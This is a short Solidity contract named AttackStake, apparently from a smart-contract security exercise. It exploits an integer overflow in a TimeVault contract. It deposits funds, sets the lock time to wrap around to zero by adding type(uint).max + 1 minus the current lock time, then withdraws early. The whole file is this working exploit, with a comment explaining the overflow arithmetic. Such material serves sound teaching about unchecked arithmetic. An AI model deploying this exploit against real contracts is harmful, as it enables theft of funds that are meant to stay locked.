// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import './TimeVault.sol';

contract AttackStake {
    TimeVault public timeVault;

    constructor(TimeVault _vaultAddress) {
        timeVault = TimeVault(_vaultAddress);
    }

    function attack(
        uint256 _depositAmount,
        address _to,
        uint256 _withdrawAwamount
    ) public {
        timeVault.deposit(_depositAmount);
        timeVault.increaseLockTime(
            /*
                if t = current lock time then we need to find x such that
                x + t = 2**256 = 0
                so x = -t
                2**256 = type(uint).max + 1
                so x = type(uint).max + 1 - t
            */
            type(uint).max + 1 - timeVault.lockTime(address(this))
        );
        timeVault.transferFunds(_to, _withdrawAwamount);
    }
}
